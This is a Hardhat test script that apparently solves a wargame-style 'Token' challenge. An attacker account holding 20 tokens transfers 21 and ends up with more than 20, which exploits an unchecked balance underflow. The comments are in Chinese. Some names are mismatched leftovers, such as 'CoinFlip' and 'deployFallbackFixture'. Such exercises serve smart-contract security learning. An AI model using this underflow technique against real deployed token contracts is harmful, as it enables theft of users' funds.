const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")
const { expect } = require("chai")
const { copyFileSync } = require("fs")
const { ethers } = require("hardhat")

describe("CoinFlip", () => {
  async function deployFallbackFixture () {
    const [deployer, attacker] = await ethers.getSigners()
    const ContractFactory = await ethers.getContractFactory("Token")
    const contract = await ContractFactory.connect(deployer).deploy(100)
    await contract.waitForDeployment()
    const contractAddress = await contract.getAddress()

    const deployAddress = await deployer.getAddress()
    const attackAddress = await attacker.getAddress()

    const transferTx = await contract.transfer(attackAddress, 20)
    await transferTx.wait()
    console.log(`攻击者余额:${await contract.balanceOf(attackAddress)}`)

    return { attacker, contract, deployAddress }
  }

  it("Should get more tokens ", async () => {
    const { attacker, contract, deployAddress } = await loadFixture(deployFallbackFixture)

    // 攻击者攻击
    const attackTx = await contract.connect(attacker).transfer(deployAddress, 21)
    await attackTx.wait()

    console.log(`攻击者余额${await contract.balanceOf(await attacker.getAddress())}`)

    expect(await contract.balanceOf(await attacker.getAddress())).to.above(20)

  })
})